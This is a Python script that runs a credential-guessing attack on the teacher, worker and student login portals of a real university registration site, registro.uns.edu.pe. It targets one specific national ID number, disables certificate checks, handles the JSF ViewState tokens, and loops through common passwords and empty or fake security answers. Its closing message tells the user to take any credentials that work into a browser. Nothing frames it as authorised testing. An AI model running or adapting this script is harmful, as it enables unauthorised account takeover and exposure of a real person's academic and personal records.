#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

DNI = '32763522'

# ============================================
# WEBDOCENTE
# ============================================
print("=" * 70)
print(f"=== WEBDOCENTE con DNI: {DNI} ===")
print("=" * 70)

# Test passwords to try
passwords = [
    DNI,                  # DNI as password
    '32763522',
    '',                   # Empty
    'fake',
    'test',
    '12345678',
    '123456',
    'password',
    'docente',
    'admin',
    '1',
]

# Also try different security question answers
security_answers = [
    '',
    'fake',
    'test',
    DNI,
    'docente',
    '32763522',
]

for pwd in passwords:
    for sec in security_answers[:3]:
        s = requests.Session()
        s.verify = False
        s.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
        })
        # Get login page
        r0 = s.get('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml', timeout=5)
        vs0 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r0.text)
        vs0_val = vs0.group(1) if vs0 else ""
        
        # Click cmdValidar
        click_data = {
            'frmLogueo': 'frmLogueo',
            'jakarta.faces.ViewState': vs0_val,
            'javax.faces.partial.ajax': 'true',
            'javax.faces.source': 'frmLogueo:cmdValidar',
            'javax.faces.partial.execute': 'frmLogueo',
            'javax.faces.partial.render': 'frmLogueo',
        }
        r_click = s.post('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
                               data=click_data, timeout=5)
        click_vs = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_click.text)
        click_vs_val = click_vs.group(1) if click_vs else ""
        
        # Submit login
        login_data = {
            'frmLogueo': 'frmLogueo',
            'jakarta.faces.ViewState': click_vs_val,
            'frmLogueo:itUsuario2': DNI,
            'frmLogueo:itSeguridad2': sec,
            'frmLogueo:kbClave': pwd,
        }
        r_login = s.post('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
                              data=login_data, timeout=5, allow_redirects=True)
        
        tc = re.sub(r'<[^>]+>', ' ', r_login.text)
        tc = re.sub(r'\s+', ' ', tc).strip()
        
        # Check for actual access indicators
        has_access = any(kw in tc.lower() for kw in ['bienvenido', 'inicio', 'dashboard', 'perfil', 'modulo', 'administrar', 'administracion', 'cargar', 'cargar_modulo'])
        has_error = any(kw in tc.lower() for kw in ['error', 'incorrecto', 'invalido', 'datos incorrectos', 'credencial'])
        still_login = 'logueo' in tc.lower() or 'cmdValidar' in tc or 'login' in tc.lower()
        
        if has_access:
            print(f"  [!] ACCESO! pwd={pwd}, sec={sec}")
            print(f"  Content: {tc[:300]}")
        elif not still_login and len(r_login.text) > 17540:
            print(f"  [!] PAGINA CAMBIO! pwd={pwd}, sec={sec}, len={len(r_login.text)}")
            print(f"  {tc[:200]}")

# Also try cmdVerClave with the DNI
print("\n=== cmdVerClave con DNI ===")
s2 = requests.Session()
s2.verify = False
s2.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
})
r0 = s2.get('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml', timeout=5)
vs0 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r0.text)
vs0_val = vs0.group(1) if vs0 else ""

click_data = {
    'frmLogueo': 'frmLogueo',
    'jakarta.faces.ViewState': vs0_val,
    'javax.faces.partial.ajax': 'true',
    'javax.faces.source': 'frmLogueo:cmdVerClave',
    'javax.faces.partial.execute': 'frmLogueo',
    'javax.faces.partial.render': 'frmLogueo',
}
r_click = s2.post('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
                       data=click_data, timeout=5)
tc_click = re.sub(r'<[^>]+>', ' ', r_click.text)
tc_click = re.sub(r'\s+', ' ', tc_click).strip()
print(f"cmdVerClave: len={len(r_click.text)}")
print(f"Content: {tc_click[:300]}")

# ============================================
# WEBTARAJADOR
# ============================================
print("\n" + "=" * 70)
print(f"=== WEBTARAJADOR con DNI: {DNI} ===")
print("=" * 70)

for pwd in [DNI, '', 'fake', '12345678']:
    for sec in ['', 'fake']:
        s3 = requests.Session()
        s3.verify = False
        s3.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
        })
        r0 = s3.get('https://registro.uns.edu.pe:80/WebTrabajador/faces/login.xhtml', timeout=5)
        vs0 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r0.text)
        vs0_val = vs0.group(1) if vs0 else ""
        
        click_data = {
            'frmLogueo': 'frmLogueo',
            'jakarta.faces.ViewState': vs0_val,
            'javax.faces.partial.ajax': 'true',
            'javax.faces.source': 'frmLogueo:cmdValidar',
            'javax.faces.partial.execute': 'frmLogueo',
            'javax.faces.partial.render': 'frmLogueo',
        }
        r_click = s3.post('https://registro.uns.edu.pe:80/WebTrabajador/faces/login.xhtml',
                               data=click_data, timeout=5)
        click_vs = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_click.text)
        click_vs_val = click_vs.group(1) if click_vs else ""
        
        login_data = {
            'frmLogueo': 'frmLogueo',
            'jakarta.faces.ViewState': click_vs_val,
            'frmLogueo:itUsuario2': DNI,
            'frmLogueo:itSeguridad2': sec,
            'frmLogueo:kbClave': pwd,
        }
        r_login = s3.post('https://registro.uns.edu.pe:80/WebTrabajador/faces/login.xhtml',
                              data=login_data, timeout=5, allow_redirects=True)
        
        tc = re.sub(r'<[^>]+>', ' ', r_login.text)
        tc = re.sub(r'\s+', ' ', tc).strip()
        
        has_access = any(kw in tc.lower() for kw in ['bienvenido', 'inicio', 'dashboard', 'perfil', 'trabajador'])
        still_login = 'logueo' in tc.lower()
        
        if has_access and not still_login:
            print(f"  [!] ACCESO! pwd={pwd}, sec={sec}")
            print(f"  {tc[:300]}")
        elif not still_login and len(r_login.text) > 17500:
            print(f"  Pagina cambio! pwd={pwd}")

# ============================================
# WEBalUMNO
# ============================================
print("\n" + "=" * 70)
print(f"=== WEBalUMNO con DNI: {DNI} ===")
print("=" * 70)

for pwd in [DNI, '', 'fake', '12345678']:
    s4 = requests.Session()
    s4.verify = False
    s4.headers.update({
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
    })
    r0 = s4.get('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml', timeout=5)
    vs0 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r0.text)
    vs0_val = vs0.group(1) if vs0 else ""
    
    click_data = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': vs0_val,
        'javax.faces.partial.ajax': 'true',
        'javax.faces.source': 'frmLogueo:cmdEstudiante',
        'javax.faces.partial.execute': 'frmLogueo',
        'javax.faces.partial.render': 'frmLogueo',
    }
    r_click = s4.post('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml',
                           data=click_data, timeout=5)
    click_vs = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_click.text)
    click_vs_val = click_vs.group(1) if click_vs else ""
    
    login_data = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': click_vs_val,
        'frmLogueo:itUsuario': DNI,
        'frmLogueo:itClave': pwd,
    }
    r_login = s4.post('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml',
                          data=login_data, timeout=5, allow_redirects=True)
    
    tc = re.sub(r'<[^>]+>', ' ', r_login.text)
    tc = re.sub(r'\s+', ' ', tc).strip()
    
    has_access = any(kw in tc.lower() for kw in ['bienvenido', 'inicio', 'dashboard', 'perfil', 'modulo'])
    still_login = 'logueo' in tc.lower()
    
    if has_access and not still_login:
        print(f"  [!] ACCESO! pwd={pwd}")
        print(f"  {tc[:300]}")
    elif not still_login and len(r_login.text) > 17500:
        print(f"  Pagina cambio! pwd={pwd}, len={len(r_login.text)}")

print("\n=== RESUMEN ===")
print("Si alguno mostro ACCESO, usá esas credenciales en el navegador")
